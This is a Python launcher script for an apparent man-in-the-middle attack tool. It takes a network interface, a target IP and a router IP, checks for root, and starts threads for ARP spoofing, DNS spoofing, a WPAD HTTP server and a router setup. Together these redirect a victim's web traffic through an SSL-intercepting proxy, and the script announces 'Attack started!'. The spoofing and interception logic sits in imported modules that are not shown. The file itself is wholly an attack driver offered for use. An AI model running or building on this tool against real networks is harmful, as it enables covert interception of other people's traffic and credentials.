#!/usr/bin/env python3

import argparse
import os
import signal
import sys
import threading
from stage import mitm, router, dns, http

parser = argparse.ArgumentParser(description="WPAD MITM SSL interception tool")
parser.add_argument("--iface",      help="Network interface to use", required=True)
parser.add_argument("--target",     help="Target IP to attack", required=True)
parser.add_argument("--router",     help="Router IP (used for ARP spoofing)", required=True)
parser.add_argument("--proxy-port", help="Port of the SSL-intercepting proxy (default: 8080)",
                    type=int, default=8080)
opts = parser.parse_args()

if os.getuid() != 0:
    print('Must be run as root')
    sys.exit(1)


def _shutdown(signum, frame):
    print('\nShutting down ...')
    router.cleanup()
    sys.exit(0)


def main():
    signal.signal(signal.SIGINT, _shutdown)
    signal.signal(signal.SIGTERM, _shutdown)

    router.run()

    threads = [
        threading.Thread(target=http.run,  args=(opts.iface, opts.proxy_port), daemon=True),
        threading.Thread(target=mitm.run,  args=(opts.router, opts.target, opts.iface), daemon=True),
        threading.Thread(target=dns.run,   args=(opts.router, opts.target, opts.iface), daemon=True),
    ]

    for t in threads:
        t.start()

    print("Attack started! Press Ctrl+C to stop.")

    for t in threads:
        t.join()


if __name__ == '__main__':
    main()
